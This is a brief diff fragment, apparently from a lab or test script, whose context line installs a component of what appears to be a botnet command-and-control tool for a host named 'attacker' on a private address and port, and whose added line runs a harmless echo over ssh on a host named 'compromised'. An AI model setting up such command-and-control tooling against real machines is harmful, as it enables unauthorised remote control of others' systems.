@@ -2,3 +2,5 @@
 
 ./install/byob.sh -cc attacker 10.10.10.1 1337
 
+ssh compromised "echo 'this is some text' >> $HOME/testing.txt"
+
